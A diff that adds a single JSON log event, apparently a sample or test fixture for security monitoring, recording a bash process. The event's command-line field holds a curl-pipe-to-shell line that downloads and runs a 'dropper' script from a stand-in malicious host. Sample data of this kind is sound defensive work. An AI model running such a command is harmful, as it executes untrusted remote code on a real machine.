@@ -1,0 +1,7 @@
+{
+  "@timestamp": "2025-07-01T10:30:00Z",
+  "event.module": "linux",
+  "process.name": "bash",
+  "process.command_line": "curl http://malicious.site/dropper.sh | sh",
+  "log.level": "info"
+}
